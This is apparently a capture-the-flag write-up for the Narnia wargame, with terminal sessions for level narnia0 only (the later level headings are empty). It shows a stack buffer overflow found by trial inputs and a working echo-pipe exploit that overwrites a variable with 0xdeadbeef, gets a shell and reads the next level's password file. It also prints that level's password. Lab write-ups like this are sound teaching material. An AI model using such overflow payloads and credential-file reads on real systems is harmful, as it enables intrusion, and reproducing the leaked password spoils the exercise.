# Narnia

## Narnia0
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcdabcdabcdabcd
buf: abcdabcdabcdabcd
val: 0x41414141
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaabbbb
buf: aaaaaaaaaaaaaaaaaaaabbbb
val: 0x62626262
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ( echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
## Narnia1
## Narnia2
## Narnia3
## Narnia4
## Narnia5
## Narnia6
## Narnia7
## Narnia8
## Narnia9
